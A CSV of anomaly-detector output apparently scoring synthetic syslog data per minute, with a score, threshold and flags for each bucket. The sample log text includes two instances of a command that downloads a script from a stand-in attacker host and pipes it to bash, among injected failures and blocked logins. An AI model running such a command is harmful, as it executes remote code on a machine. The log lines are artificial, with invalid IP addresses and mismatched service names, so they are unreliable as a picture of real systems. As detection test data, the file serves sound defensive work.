bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 21:08:00,0.9999017717130637,1,1,0.8224995273096307,3,60,kernel: Started Cleanup of Temporary Directories. || systemd: Started Session c166 of user root. || ntpd: Accepted publickey for user from 10.0.0.186 port 22 ssh2. || gpm: Started CUPS Scheduler. || ftpd: Rotating log files. || systemd: Listening on 
2026-07-01 21:09:00,0.9999007039395027,1,1,0.8224995273096307,3,60,sshd: Synced RTC time from system clock. || ftpd: Rotating log files. || telnetd: Started Cleanup of Temporary Directories. || cups: Listening on LVM2 poll daemon socket. || sudo: Started CUPS Scheduler. || xinetd: Synced RTC time from system clock. 
2026-07-01 21:10:00,0.9997725046635197,1,1,0.8224995273096307,3,59,dockerd: Rotating log files. || named: Accepted publickey for user from 10.0.0.49 port 22 ssh2. || sudo: Started CUPS Scheduler. || xinetd: kernel: Out of memory: Kill process 19347 (python3) score 987 or sacrifice child || chronyd: Synced RTC time f
2026-07-01 21:11:00,0.9994839765580377,1,1,0.8224995273096307,3,62,telnetd: Rotating log files. || sshd: Started CUPS Scheduler. || ftpd: Synced RTC time from system clock. || unix_chkpwd: Finished Daily apt download activities. || logrotate: Started Cleanup of Temporary Directories. || chronyd: Listening on LVM2 po
2026-07-01 21:12:00,0.9976955283614439,1,1,0.8224995273096307,3,60,docker: Failed password for invalid user test from 192.168.1.1626 port 22 ssh2 || ftpd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.41341 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || redis-server: Finished Daily apt download activities. || sudo: Star
2026-07-01 21:13:00,0.997829952978821,1,1,0.8224995273096307,3,64,unix_chkpwd: Listening on LVM2 poll daemon socket. || systemd: Started Cleanup of Temporary Directories. || gpm: Started Session c184 of user root. || kernel: Started CUPS Scheduler. || unattended-upgrades: Started Cleanup of Temporary Directories. |
2026-07-01 21:14:00,0.9997438752033013,1,1,0.8224995273096307,3,61,CRON: Started Session c25 of user root. || kernel: Started Cleanup of Temporary Directories. || CRON: Listening on LVM2 poll daemon socket. || sshd: Synced RTC time from system clock. || unattended-upgrades: Finished Daily apt download activities. ||
2026-07-01 21:15:00,0.9995772324782582,1,1,0.8224995273096307,3,57,ftpd: Finished Daily apt download activities. || ftpd: Started Session c1 of user root. || gpm: Started Session c224 of user root. || smartd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || logrotate: Started
2026-07-01 21:16:00,0.9992353817556883,1,1,0.8224995273096307,3,55,ntpd: Synced RTC time from system clock. || systemd: Started Session c245 of user root. || ntpd: Started Session c36 of user root. || NetworkManager: Accepted publickey for user from 10.0.0.11 port 22 ssh2. || rsyslogd: Accepted publickey for user fr
2026-07-01 21:17:00,0.9995008328685183,1,1,0.8224995273096307,3,57,cups: Finished Daily apt download activities. || dockerd: Rotating log files. || rsyslogd: Started CUPS Scheduler. || ftpd: Listening on LVM2 poll daemon socket. || systemd: Rotating log files. || NetworkManager: Rotating log files. || ntpd: Started 
2026-07-01 21:18:00,0.9987157847292875,1,1,0.8224995273096307,3,63,named: bash: -c: line 1: curl http://bad.site/payload.sh | bash || telnetd: Rotating log files. || ftpd: Accepted publickey for user from 10.0.0.226 port 22 ssh2. || unix_chkpwd: Synced RTC time from system clock. || xinetd: Listening on LVM2 poll da
2026-07-01 21:19:00,0.987016480777614,1,1,0.8224995273096307,3,59,systemd: Rotating log files. || gpm: Started Cleanup of Temporary Directories. || smartd: Rotating log files. || redis-server: Rotating log files. || sshd: Listening on LVM2 poll daemon socket. || ufw: Listening on LVM2 poll daemon socket. || docker:
2026-07-01 21:20:00,0.9911045808119048,1,1,0.8224995273096307,3,61,NetworkManager: Listening on LVM2 poll daemon socket. || gpm: Accepted publickey for user from 10.0.0.138 port 22 ssh2. || unattended-upgrades: Listening on LVM2 poll daemon socket. || kernel: Rotating log files. || unix_chkpwd: Rotating log files. |
2026-07-01 21:21:00,0.998928990945201,1,1,0.8224995273096307,3,58,ufw: Finished Daily apt download activities. || systemd: Finished Daily apt download activities. || sshd: Started CUPS Scheduler. || ftpd: Rotating log files. || ufw: Started Session c170 of user root. || gpm: Started Cleanup of Temporary Directories
2026-07-01 21:22:00,0.9998549155445765,1,1,0.8224995273096307,3,58,xinetd: Finished Daily apt download activities. || smartd: Rotating log files. || chronyd: Rotating log files. || dockerd: Finished Daily apt download activities. || xinetd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: readin
2026-07-01 21:23:00,0.9999928631800521,1,1,0.8224995273096307,3,60,ntpd: Synced RTC time from system clock. || smartd: Started Session c246 of user root. || telnetd: Rotating log files. || chronyd: Accepted publickey for user from 10.0.0.179 port 22 ssh2. || CRON: Accepted publickey for user from 10.0.0.133 port 22 
2026-07-01 21:24:00,0.9999905203963942,1,1,0.8224995273096307,3,59,redis-server: Rotating log files. || docker: Started Session c33 of user root. || ufw: Rotating log files. || sshd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || gpm: Started Session c225 of user root. || s
2026-07-01 21:25:00,0.9999900231321798,1,1,0.8224995273096307,3,63,redis-server: Finished Daily apt download activities. || cups: Accepted publickey for user from 10.0.0.48 port 22 ssh2. || telnetd: Started CUPS Scheduler. || xinetd: Synced RTC time from system clock. || named: Started Cleanup of Temporary Directori
2026-07-01 21:26:00,0.9998602102783378,1,1,0.8224995273096307,3,59,gpm: Accepted publickey for user from 10.0.0.112 port 22 ssh2. || gpm: Synced RTC time from system clock. || CRON: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || dockerd: Rotating log files. || CRON: Accepte
2026-07-01 21:27:00,0.9974961475494719,1,1,0.8224995273096307,3,57,NetworkManager: Rotating log files. || ftpd: Finished Daily apt download activities. || docker: Accepted publickey for user from 10.0.0.189 port 22 ssh2. || gpm: Started Session c117 of user root. || rsyslogd: Rotating log files. || redis-server: Sta
2026-07-01 21:28:00,0.9974789636259583,1,1,0.8224995273096307,3,61,named: Rotating log files. || telnetd: Rotating log files. || docker: Synced RTC time from system clock. || smartd: kernel: Out of memory: Kill process 19813 (python3) score 987 or sacrifice child || ntpd: Failed password for invalid user test from 1
2026-07-01 21:29:00,0.9994858193897623,1,1,0.8224995273096307,3,60,rsyslogd: Accepted publickey for user from 10.0.0.244 port 22 ssh2. || systemd: Rotating log files. || chronyd: Started Cleanup of Temporary Directories. || chronyd: Accepted publickey for user from 10.0.0.170 port 22 ssh2. || logrotate: app[1234]: s
2026-07-01 21:30:00,0.9996720311492991,1,1,0.8224995273096307,3,60,sudo: Started Cleanup of Temporary Directories. || ntpd: Started CUPS Scheduler. || systemd-timesyncd: Started Cleanup of Temporary Directories. || smartd: Started Session c124 of user root. || logrotate: Started Cleanup of Temporary Directories. || 
2026-07-01 21:31:00,0.9992037115338681,1,1,0.8224995273096307,3,60,CRON: Started Session c67 of user root. || unattended-upgrades: Synced RTC time from system clock. || ufw: Started CUPS Scheduler. || smartd: Started Cleanup of Temporary Directories. || kernel: kernel: Kernel panic - not syncing: Fatal exception || 
2026-07-01 21:32:00,0.9998906758812878,1,1,0.8224995273096307,3,59,unattended-upgrades: Rotating log files. || systemd: Finished Daily apt download activities. || xinetd: Started CUPS Scheduler. || cups: Started CUPS Scheduler. || rsyslogd: Rotating log files. || systemd: Rotating log files. || named: Listening on L
2026-07-01 21:33:00,0.9996807870553716,1,1,0.8224995273096307,3,60,redis-server: Finished Daily apt download activities. || CRON: Started CUPS Scheduler. || CRON: Started Session c89 of user root. || smartd: Accepted publickey for user from 10.0.0.72 port 22 ssh2. || CRON: Synced RTC time from system clock. || chron
2026-07-01 21:34:00,0.9993920755021056,1,1,0.8224995273096307,3,55,ntpd: Synced RTC time from system clock. || rsyslogd: Rotating log files. || unix_chkpwd: Accepted publickey for user from 10.0.0.209 port 22 ssh2. || sshd: Synced RTC time from system clock. || gpm: Accepted publickey for user from 10.0.0.219 port 2
2026-07-01 21:35:00,0.9996552193132942,1,1,0.8224995273096307,3,58,ftpd: Rotating log files. || CRON: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.52398 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || redis-server: Accepted publickey for user from 10.0.0.129 port 22 ssh2. || named: Finished Daily apt download activities
2026-07-01 21:36:00,0.9973073190479845,1,1,0.8224995273096307,3,60,redis-server: Synced RTC time from system clock. || kernel: Rotating log files. || ntpd: Synced RTC time from system clock. || unix_chkpwd: Started CUPS Scheduler. || unix_chkpwd: Started Session c195 of user root. || dockerd: Synced RTC time from sy
2026-07-01 21:37:00,0.9964677786939411,1,1,0.8224995273096307,3,61,dockerd: Started CUPS Scheduler. || unattended-upgrades: Listening on LVM2 poll daemon socket. || kernel: Started Session c228 of user root. || unattended-upgrades: Started Session c212 of user root. || sshd: Started Session c93 of user root. || ftpd
2026-07-01 21:38:00,0.9997173564258052,1,1,0.8224995273096307,3,63,ftpd: Rotating log files. || named: Started CUPS Scheduler. || smartd: Finished Daily apt download activities. || kernel: Failed password for invalid user test from 192.168.1.2514 port 22 ssh2 || telnetd: Synced RTC time from system clock. || unix_ch
2026-07-01 21:39:00,0.9999717186355048,1,1,0.8224995273096307,3,58,dockerd: Listening on LVM2 poll daemon socket. || xinetd: Started Session c254 of user root. || cups: Started CUPS Scheduler. || docker: Accepted publickey for user from 10.0.0.206 port 22 ssh2. || telnetd: Started CUPS Scheduler. || docker: Rotating
2026-07-01 21:40:00,0.999767307675097,1,1,0.8224995273096307,3,56,systemd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || NetworkManager: Started Cleanup of Temporary Directories. || telnetd: Synced RTC time from system clock. || CRON: Finished Daily apt download activitie
2026-07-01 21:41:00,0.9992644028106492,1,1,0.8224995273096307,3,59,named: Rotating log files. || ufw: Started Cleanup of Temporary Directories. || docker: Finished Daily apt download activities. || unattended-upgrades: Started CUPS Scheduler. || CRON: Rotating log files. || systemd-timesyncd: Finished Daily apt down
2026-07-01 21:42:00,0.9999436010342206,1,1,0.8224995273096307,3,59,ntpd: Synced RTC time from system clock. || CRON: Synced RTC time from system clock. || unix_chkpwd: Started Session c67 of user root. || smartd: Started Cleanup of Temporary Directories. || unattended-upgrades: Rotating log files. || cups: Accepted 
2026-07-01 21:43:00,0.9999765185913804,1,1,0.8224995273096307,3,61,dockerd: Started Session c8 of user root. || systemd-timesyncd: Accepted publickey for user from 10.0.0.157 port 22 ssh2. || systemd-timesyncd: Started Session c252 of user root. || redis-server: Started Cleanup of Temporary Directories. || redis-ser
2026-07-01 21:44:00,0.9998921354929171,1,1,0.8224995273096307,3,61,NetworkManager: Accepted publickey for user from 10.0.0.131 port 22 ssh2. || xinetd: Synced RTC time from system clock. || xinetd: Started Cleanup of Temporary Directories. || telnetd: Started Session c128 of user root. || unix_chkpwd: Started CUPS S
2026-07-01 21:45:00,0.9998730928182862,1,1,0.8224995273096307,3,61,redis-server: Finished Daily apt download activities. || named: Started Session c76 of user root. || ftpd: Finished Daily apt download activities. || named: Started Session c99 of user root. || unix_chkpwd: Accepted publickey for user from 10.0.0.17 
2026-07-01 21:46:00,0.999717977023413,1,1,0.8224995273096307,3,57,kernel: Synced RTC time from system clock. || unix_chkpwd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || NetworkManager: bash: -c: line 1: curl http://bad.site/payload.sh | bash || telnetd: Listening on LVM
2026-07-01 21:47:00,0.9999524372172335,1,1,0.8224995273096307,3,61,systemd: Started Cleanup of Temporary Directories. || xinetd: Synced RTC time from system clock. || dockerd: Started Cleanup of Temporary Directories. || systemd-timesyncd: Started Cleanup of Temporary Directories. || unix_chkpwd: Started Session c20
2026-07-01 21:48:00,0.9998635613374034,1,1,0.8224995273096307,3,60,CRON: Started Cleanup of Temporary Directories. || systemd-timesyncd: Started CUPS Scheduler. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || NetworkManager: Synced RTC time from system clock. || CRON: Synced RTC time from system clock
2026-07-01 21:49:00,0.9996578563932532,1,1,0.8224995273096307,3,58,rsyslogd: Started Session c108 of user root. || redis-server: Accepted publickey for user from 10.0.0.181 port 22 ssh2. || systemd: Started Session c228 of user root. || chronyd: Rotating log files. || kernel: kernel: Out of memory: Kill process 4297
2026-07-01 21:50:00,0.9960256383574755,1,1,0.8224995273096307,3,58,rsyslogd: Started Cleanup of Temporary Directories. || NetworkManager: Started Session c18 of user root. || NetworkManager: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started CUPS Scheduler. || unix_chkpwd: Rotating log files. || cup
2026-07-01 21:51:00,0.998791161124862,1,1,0.8224995273096307,3,62,NetworkManager: Synced RTC time from system clock. || systemd: Rotating log files. || NetworkManager: Started Cleanup of Temporary Directories. || chronyd: Synced RTC time from system clock. || redis-server: Synced RTC time from system clock. || CRON
2026-07-01 21:52:00,0.999768423890226,1,1,0.8224995273096307,3,61,logrotate: Synced RTC time from system clock. || systemd: Synced RTC time from system clock. || dockerd: Started CUPS Scheduler. || logrotate: Rotating log files. || CRON: Rotating log files. || cups: Listening on LVM2 poll daemon socket. || unix_chk
2026-07-01 21:53:00,0.9973967147779152,1,1,0.8224995273096307,3,65,unix_chkpwd: Started Session c8 of user root. || dockerd: Synced RTC time from system clock. || named: Started CUPS Scheduler. || gpm: Synced RTC time from system clock. || logrotate: Synced RTC time from system clock. || NetworkManager: Started CUPS
2026-07-01 21:54:00,0.9737088629860036,1,1,0.8224995273096307,3,58,unattended-upgrades: Started Cleanup of Temporary Directories. || NetworkManager: Started Session c160 of user root. || ufw: Started CUPS Scheduler. || redis-server: Finished Daily apt download activities. || xinetd: Started CUPS Scheduler. || docker
2026-07-01 21:55:00,0.9966757459076936,1,1,0.8224995273096307,3,58,sudo: Finished Daily apt download activities. || chronyd: Synced RTC time from system clock. || systemd: Accepted publickey for user from 10.0.0.28 port 22 ssh2. || chronyd: Started CUPS Scheduler. || redis-server: Started CUPS Scheduler. || sshd: St
2026-07-01 21:56:00,0.9981377172088147,1,1,0.8224995273096307,3,65,rsyslogd: Started Session c132 of user root. || rsyslogd: Finished Daily apt download activities. || ufw: Started Session c174 of user root. || named: Accepted publickey for user from 10.0.0.176 port 22 ssh2. || systemd-timesyncd: Finished Daily apt 
